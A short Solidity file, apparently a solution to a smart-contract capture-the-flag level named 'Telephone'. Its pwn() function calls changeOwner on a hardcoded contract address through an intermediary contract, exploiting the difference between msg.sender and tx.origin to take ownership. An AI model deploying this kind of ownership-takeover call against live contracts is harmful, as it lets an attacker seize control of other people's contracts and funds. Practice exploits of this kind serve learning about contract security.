// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    function changeOwner(address _owner) public {}
}

contract TelephoneSol {
    function pwn() external {
        address _addr = 0xcfBc64351d0FD4275572895cb530a7BFb8071DeC;
        Telephone contr = Telephone(_addr);
        contr.changeOwner(msg.sender);
    }
}